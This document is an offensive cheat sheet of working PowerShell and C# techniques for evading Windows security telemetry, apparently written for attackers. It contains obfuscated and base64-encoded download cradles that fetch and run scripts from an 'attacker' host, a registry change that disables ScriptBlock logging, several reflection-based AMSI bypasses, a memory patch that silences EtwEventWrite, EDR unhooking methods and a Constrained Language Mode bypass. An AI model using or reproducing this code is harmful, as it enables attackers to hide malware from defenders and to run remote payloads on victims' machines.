# AMSI / ETW / PowerShell Telemetry Bypass

## PowerShell Execution Policy Bypass

```powershell
# Bypass for single script
powershell -ExecutionPolicy Bypass -File script.ps1

# Encoded command (avoids command-line logging)
$cmd = 'IEX (New-Object Net.WebClient).DownloadString("http://attacker/tool.ps1")'
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell -EncodedCommand $enc

# Obfuscated download cradle
&('I'+'EX') (New-Object Net.WebClient).DownloadString('http://attacker/ps.ps1')

# Disable ScriptBlock logging (needs admin)
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
  -Name EnableScriptBlockLogging -Value 0
```

---

## AMSI Bypass

Run ONE of these in the PS session before loading any tool that would trigger AMSI.

**Method 1 — Null amsiSession (classic)**
```powershell
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiSession','NonPublic,Static')
$b.SetValue($null, $null)
```

**Method 2 — Set amsiInitFailed**
```powershell
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null, $true)
```

**Method 3 — Zero out amsiContext via COM interface**
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null,[IntPtr]::Zero)
```

**Method 4 — Memory patch amsi.dll (requires P/Invoke)**
```powershell
# Patch AmsiScanBuffer to always return AMSI_RESULT_CLEAN (0x80070057 → ret)
# Use Invoke-ReflectivePEInjection or direct VirtualProtect + WriteProcessMemory approach
```

**Verification**
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').GetValue($null)
# Should return True if bypass succeeded
```

---

## ETW (Event Tracing for Windows) Bypass

```powershell
# Method 1 — PowerShell provider disable
[System.Diagnostics.Eventing.EventProvider]::SetEnabled([System.Guid]::NewGuid(), 0, 0)

# Method 2 — Patch EtwEventWrite in ntdll.dll to RET immediately
# (requires P/Invoke — do this from C# / BOF)
$ntdll  = [Win32.Kernel32]::LoadLibrary("ntdll.dll")
$etwFn  = [Win32.Kernel32]::GetProcAddress($ntdll, "EtwEventWrite")
$old    = 0
[Win32.Kernel32]::VirtualProtect($etwFn, [uint32]1, 0x40, [ref]$old)
[Win32.Kernel32]::WriteProcessMemory(-1, $etwFn, [byte[]](0xC3), 1, [ref]$null)
# 0xC3 = RET — function returns immediately, events never written
```

---

## API Unhooking (remove EDR hooks from ntdll)

EDRs hook ntdll syscall stubs in userland. Load a clean copy to remove hooks.

**Method 1 — Load clean ntdll from disk**
```csharp
// Read clean .text section from C:\Windows\System32\ntdll.dll
// Map over current process ntdll .text section
// All syscall stubs now point to clean kernel transitions
```

**Method 2 — Direct syscalls (Hell's Gate / Halo's Gate)**
```
Parse ntdll to extract syscall numbers dynamically (even if first bytes are hooked)
Issue syscall instruction directly — bypasses userland hooks entirely
Tools: SysWhispers2, SysWhispers3, HellsGate
```

**Method 3 — Load from KnownDlls**
```csharp
// OpenFileMapping("\\KnownDlls\\ntdll.dll")
// Map clean section — not touched by EDR injected hooks
```

---

## Constrained Language Mode Bypass

```powershell
# Check current mode
$ExecutionContext.SessionState.LanguageMode   # FullLanguage / ConstainedLanguage

# Bypass via runspace (if PowerShell version < 5.1 logging not enforced)
$rs = [RunspaceFactory]::CreateRunspace()
$rs.Open()
$ps = [PowerShell]::Create()
$ps.Runspace = $rs
$ps.AddScript('$ExecutionContext.SessionState.LanguageMode = "FullLanguage"')
$ps.Invoke()
```
